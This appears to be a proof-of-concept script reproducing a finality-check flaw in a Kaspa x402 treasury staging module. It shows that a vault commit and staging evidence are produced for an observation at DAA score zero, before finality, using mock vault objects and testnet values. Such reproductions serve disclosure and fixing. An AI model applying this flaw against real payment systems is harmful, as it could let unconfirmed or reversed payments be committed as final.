import assert from "node:assert/strict";
import { access } from "node:fs/promises";
import path from "node:path";
import { pathToFileURL } from "node:url";

const targetArgument = process.argv[2];
if (!targetArgument) {
  console.error("usage: node reproduce.mjs <relative-path-to-built-sompi>");
  process.exit(2);
}

const target = path.resolve(process.cwd(), targetArgument);
const modulePath = path.join(
  target,
  "dist/adapters/kaspa-x402/vault-treasury-staging.js",
);
await access(modulePath);

const { VaultTreasuryStaging } = await import(pathToFileURL(modulePath).href);
console.log("[+] loaded production VaultTreasuryStaging");

const txid = "44".repeat(32);
const digest = `sha256:${"A".repeat(43)}`;
const prepared = Object.freeze({
  transaction: "{}",
  transactionEncoding: "kaspa-sdk-safe-json-v2.0.0",
  transactionId: txid,
  destination: "kaspatest:staging",
  destinationOutpoint: Object.freeze({ txid, index: 0 }),
  amountSompi: 32_000_000n,
  feeSompi: 1_000_000n,
  continuationOutpoint: Object.freeze({ txid, index: 1 }),
  continuationAddress: "kaspatest:continuation",
  continuationAmountSompi: 400_000_000n,
  covenantId: "55".repeat(32),
  baseConfigDigest: digest,
  configUpdate: Object.freeze({
    windowStartDaa: "1",
    spentInWindowSompi: "1",
    address: "kaspatest:continuation",
    currentOutpoint: Object.freeze({ txid, index: 1 }),
  }),
});
const observed = Object.freeze({
  transactionId: txid,
  destinationOutpoint: prepared.destinationOutpoint,
  continuationOutpoint: prepared.continuationOutpoint,
  amountSompi: prepared.amountSompi,
  continuationAmountSompi: prepared.continuationAmountSompi,
  observedAtDaa: 0n,
});
const envelope = Object.freeze({
  version: 1,
  profile: "urn:sompi:kaspa-x402:treasury-staging:1",
  binding: Object.freeze({
    purchaseId: "pur_AQEBAQEBAQEBAQEBAQEBAQ",
    paymentIdentifier: "pay_validation",
    checkoutDigest: digest,
    authorizationEvidenceDigest: digest,
    requestFingerprint: digest,
    paymentRequirementsDigest: digest,
    merchantId: "merchant:test",
    resourceFingerprint: digest,
    priceAtomic: "20000000",
    asset: "KAS",
    network: "kaspa:testnet-10",
    payTo: "kaspatest:merchant",
    additionalCostCeilingAtomic: "30000000",
    additiveThresholdAtomic: "10000000",
    exactFeeAtomic: "2000000",
  }),
  stagingKey: Object.freeze({
    keyReference: "staging-key:validation",
    network: "kaspa:testnet-10",
    address: prepared.destination,
    publicKey: "66".repeat(32),
    scriptPublicKey: "000051",
    createdAt: "2030-01-01T00:00:00.000Z",
  }),
  spend: Object.freeze({
    transaction: prepared.transaction,
    transactionEncoding: prepared.transactionEncoding,
    transactionId: txid,
    destination: prepared.destination,
    destinationOutpoint: prepared.destinationOutpoint,
    amountAtomic: prepared.amountSompi.toString(),
    feeAtomic: prepared.feeSompi.toString(),
    continuationOutpoint: prepared.continuationOutpoint,
    continuationAddress: prepared.continuationAddress,
    continuationAmountAtomic: prepared.continuationAmountSompi.toString(),
    covenantId: prepared.covenantId,
    baseConfigDigest: prepared.baseConfigDigest,
    configUpdate: prepared.configUpdate,
  }),
});

let commitCalls = 0;
const vault = {
  commitObservedSend(actualPrepared, actualObserved) {
    commitCalls += 1;
    assert.equal(actualPrepared, prepared);
    assert.equal(actualObserved.observedAtDaa, 0n);
  },
};
const staging = new VaultTreasuryStaging({ vault, wallet: {}, keyStore: {} });
const commitAndEvidence = staging.commitAndEvidence;
assert.equal(
  typeof commitAndEvidence,
  "function",
  "target no longer exposes the vulnerable production sink shape",
);

const result = commitAndEvidence.call(staging, envelope, prepared, observed);
const evidence = JSON.parse(Buffer.from(result.evidence.bytes).toString("utf8"));
assert.equal(commitCalls, 1);
assert.equal(evidence.observedAtDaa, "0");
assert.equal(result.transactionId, txid);

console.log("[+] accepted provisional observation: observedAtDaa=0");
console.log(`[+] durable vault commit calls: ${commitCalls}`);
console.log("[+] emitted staging evidence before accepted-finality proof");
console.log(JSON.stringify({
  acceptedDaaZero: evidence.observedAtDaa === "0",
  commitCalls,
  emittedStagedEvidence: true,
  observedAtDaaInEvidence: evidence.observedAtDaa,
}));
